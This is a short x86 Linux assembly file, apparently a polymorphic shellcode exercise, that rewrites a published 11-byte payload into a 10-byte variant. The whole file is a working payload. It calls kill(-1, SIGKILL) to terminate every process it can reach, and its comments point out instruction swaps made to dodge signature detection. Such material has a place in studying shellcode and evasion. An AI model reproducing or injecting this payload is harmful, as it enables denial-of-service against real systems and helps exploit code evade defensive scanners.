; linux/x86 kill all processes
; Original Shellcode - 11 bytes: http://shell-storm.org/shellcode/files/shellcode-212.php
; Polymorphic Shellcode - 10 bytes
; Author: buffered4ever
; 15-03-2019

global _start 
section .text
 
_start:
        ; kill(-1, SIGKILL);
	push byte 37 
        pop eax ; #define __NR_kill 37 
	push byte -1
	pop ebx; 
        mov cl, 9 ; changed from push byte 9 pop ecx
        int 0x80

